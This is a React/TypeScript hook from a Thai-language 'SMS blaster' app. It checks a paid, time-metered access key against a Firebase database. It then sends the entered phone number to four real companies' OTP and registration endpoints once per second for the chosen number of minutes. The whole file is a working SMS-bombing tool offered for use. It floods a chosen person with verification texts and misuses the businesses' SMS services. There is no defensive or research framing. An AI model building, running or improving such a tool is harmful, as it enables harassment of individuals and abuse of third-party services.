
import { useState, useRef } from "react";
import { useToast } from "@/components/ui/use-toast";
import axios from "axios";

interface LogEntry {
  timestamp: string;
  phone: string;
  status: 'success' | 'error';
  message: string;
}

interface PhoneReport {
  reason: string;
  count: number;
}

export const useSMSBlaster = () => {
  const [phoneNumber, setPhoneNumber] = useState("");
  const [minutes, setMinutes] = useState("1");
  const [loading, setLoading] = useState(false);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [remainingTime, setRemainingTime] = useState<number>(0);
  const [apiKey, setApiKey] = useState("");
  const [showKeyInput, setShowKeyInput] = useState(false);
  const [phoneReport, setPhoneReport] = useState<PhoneReport | null>(null);
  const timerRef = useRef<NodeJS.Timeout>();
  const { toast } = useToast();

  const validatePhoneNumber = (number: string) => {
    const regex = /^0\d{9}$/;
    return regex.test(number);
  };

  const addLog = (phone: string, status: 'success' | 'error', message: string) => {
    setLogs(prev => [{
      timestamp: new Date().toLocaleTimeString(),
      phone,
      status,
      message
    }, ...prev]);
  };

  const checkPhoneReport = async (phone: string) => {
    try {
      const response = await axios.get(`https://goak-71ac8-default-rtdb.firebaseio.com/reports/${phone}.json`);
      if (response.data) {
        setPhoneReport(response.data);
        setShowKeyInput(true);
        toast({
          title: "⚠️ คำเตือน",
          description: `เบอร์นี้ถูกรายงานว่า: ${response.data.reason}`,
          variant: "destructive",
        });
      } else {
        setShowKeyInput(true);
      }
    } catch (error) {
      console.error("Error checking phone report:", error);
      setShowKeyInput(true);
    }
  };

  const validateApiKey = async (key: string) => {
    try {
      const response = await axios.get(`https://goak-71ac8-default-rtdb.firebaseio.com/keys/${key}.json`);
      if (response.data && response.data.active) {
        const expireDate = new Date(response.data.expireDate);
        if (expireDate > new Date()) {
          // Check remaining minutes
          const totalMinutes = response.data.totalMinutes || 0;
          const usedMinutes = response.data.usedMinutes || 0;
          const requestedMinutes = parseInt(minutes);
          
          if (usedMinutes + requestedMinutes > totalMinutes) {
            toast({
              title: "เวลาไม่เพียงพอ",
              description: `คีย์นี้เหลือเวลาใช้งานได้อีก ${totalMinutes - usedMinutes} นาที`,
              variant: "destructive",
            });
            return false;
          }
          return true;
        } else {
          toast({
            title: "API Key หมดอายุ",
            description: "กรุณาติดต่อแอดมินเพื่อต่ออายุ Key",
            variant: "destructive",
          });
          return false;
        }
      }
      toast({
        title: "API Key ไม่ถูกต้อง",
        description: "กรุณาตรวจสอบ Key ของท่าน",
        variant: "destructive",
      });
      return false;
    } catch (error) {
      console.error("Error validating API key:", error);
      return false;
    }
  };

  const updateUsedMinutes = async () => {
    try {
      const response = await axios.get(`https://goak-71ac8-default-rtdb.firebaseio.com/keys/${apiKey}.json`);
      if (response.data) {
        const currentUsedMinutes = response.data.usedMinutes || 0;
        const newUsedMinutes = currentUsedMinutes + parseInt(minutes);
        await axios.patch(`https://goak-71ac8-default-rtdb.firebaseio.com/keys/${apiKey}.json`, {
          usedMinutes: newUsedMinutes
        });
      }
    } catch (error) {
      console.error("Error updating used minutes:", error);
    }
  };

  const startSMSBlast = async () => {
    setLoading(true);
    const totalSeconds = parseInt(minutes) * 60;
    setRemainingTime(totalSeconds);
    addLog(phoneNumber, 'success', `เริ่มต้นการส่ง SMS เป็นเวลา ${minutes} นาที`);
    
    // Update used minutes
    await updateUsedMinutes();
    
    // Start countdown timer
    const countdownInterval = setInterval(() => {
      setRemainingTime(prev => {
        if (prev <= 1) {
          clearInterval(countdownInterval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    const sendSMS = async () => {
      const endpoints = [
        { api: api1, name: 'API 1' },
        { api: api2, name: 'API 2' },
        { api: api4, name: 'API 4' },
        { api: api5, name: 'API 5' }
      ];

      for (const { api, name } of endpoints) {
        try {
          await api(phoneNumber);
          addLog(phoneNumber, 'success', `✓ ส่ง SMS สำเร็จผ่าน ${name}`);
        } catch (error) {
          addLog(phoneNumber, 'error', `⚠ ไม่สามารถส่ง SMS ผ่าน ${name}`);
          console.error(`Error with endpoint ${name}:`, error);
        }
      }
    };

    // Send SMS every second
    const smsInterval = setInterval(async () => {
      await sendSMS();
    }, 1000);

    setTimeout(() => {
      clearInterval(smsInterval);
      clearInterval(countdownInterval);
      setLoading(false);
      setRemainingTime(0);
      addLog(phoneNumber, 'success', `🏁 สิ้นสุดการส่ง SMS แล้ว`);
      toast({
        title: "สำเร็จ",
        description: `สิ้นสุดการส่ง SMS ไปยังหมายเลข ${phoneNumber}`,
      });
    }, totalSeconds * 1000);
  };

  const handlePhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validatePhoneNumber(phoneNumber)) {
      toast({
        title: "หมายเลขโทรศัพท์ไม่ถูกต้อง",
        description: "กรุณากรอกหมายเลขโทรศัพท์ 10 หลัก ที่ขึ้นต้นด้วย 0",
        variant: "destructive",
      });
      return;
    }

    await checkPhoneReport(phoneNumber);
  };

  const handleApiKeySubmit = async () => {
    if (await validateApiKey(apiKey)) {
      startSMSBlast();
    }
  };

  return {
    phoneNumber,
    setPhoneNumber,
    minutes,
    setMinutes,
    loading,
    logs,
    remainingTime,
    apiKey,
    setApiKey,
    showKeyInput,
    phoneReport,
    handlePhoneSubmit,
    handleApiKeySubmit,
  };
};

const api1 = async (phone: string) => {
  const url = `https://www.dataiku-thai.com/api/reg/sms?account=${phone}`;
  const headers = {
    'Language': 'th-TH',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Encoding': 'gzip, deflate, br',
  };
  await axios.get(url, { headers });
};

const api2 = async (phone: string) => {
  const url = "https://openapi.bigc.co.th/customer/v1/otp";    
  const headers = {
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "Device-Info": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0",
    "Language": "th",
    "Origin": "https://www.bigc.co.th",
    "Platform": "web-desktop",
    "Referer": "https://www.bigc.co.th/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0",
    "Version": "1.69.3",
  };
  const data = { phone_no: phone };
  await axios.post(url, data, { headers });
};

const api4 = async (phone: string) => {
  const url = "https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp";
  const data = { mobile_phone_no: phone };
  await axios.post(url, data);
};

const api5 = async (phone: string) => {
  const url = "https://www.siam191.app/api/user/request-register-tac";
  const data = {
    sendType: "mobile",
    currency: "THB",
    country_code: "66",
    mobileno: phone,
    language: "th",
    langCountry: "th-th"
  };
  await axios.post(url, data);
};
